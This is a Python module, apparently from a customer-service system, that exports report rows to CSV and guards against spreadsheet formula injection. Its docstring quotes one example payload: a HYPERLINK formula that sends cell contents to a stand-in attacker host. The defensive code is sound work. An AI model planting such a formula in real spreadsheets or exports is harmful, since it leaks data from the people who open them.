import csv
import io
from collections.abc import Sequence

from sac.application.ports_reporting import ReportExportRow

CSV_HEADER: tuple[str, ...] = (
    "número",
    "marca",
    "status",
    "prioridade",
    "cliente",
    "documento",
    "telefone",
    "email",
    "produtos",
    "defeitos",
    "solução",
    "canal",
    "atendente",
    "pedido",
    "aberto_em",
    "fechado_em",
)


def csv_line(values: Sequence[str | int | None]) -> str:
    buffer = io.StringIO()
    writer = csv.writer(buffer, lineterminator="\r\n")
    writer.writerow(values)
    return buffer.getvalue()


# Caracteres que fazem o Excel/LibreOffice tratar a celula como formula em vez de
# texto. O tab e o CR entram porque o Excel os consome como separador e reavalia o
# que vem depois.
_INICIO_DE_FORMULA = ("=", "+", "-", "@", "\t", "\r")


def _text(value: str | None) -> str:
    """Texto livre de cadastro, neutralizado contra formula injection.

    O export sai com BOM UTF-8 porque o destino e abrir no Excel, e todo campo
    aqui vem de cadastro do tenant (nome de cliente, de produto, codigo de
    pedido) validado so por tamanho. Um nome como
    `=HYPERLINK("http://atacante/x?d="&A1;"clique")` executaria na maquina de
    quem abre o relatorio. O apostrofo inicial e a neutralizacao padrao: o Excel
    exibe o conteudo como texto e nao mostra o apostrofo na celula.
    """
    if value is None:
        return ""
    if value.startswith(_INICIO_DE_FORMULA):
        return f"'{value}"
    return value


def export_row_values(row: ReportExportRow) -> list[str | int | None]:
    return [
        row.number,
        _text(row.brand),
        row.status,
        row.priority,
        _text(row.customer_name),
        _text(row.customer_document),
        _text(row.customer_phone),
        _text(row.customer_email),
        _text(row.products),
        _text(row.defects),
        _text(row.solution),
        _text(row.channel),
        _text(row.attendant),
        _text(row.order_code),
        row.opened_at.strftime("%Y-%m-%d %H:%M"),
        row.closed_at.strftime("%Y-%m-%d %H:%M") if row.closed_at is not None else "",
    ]
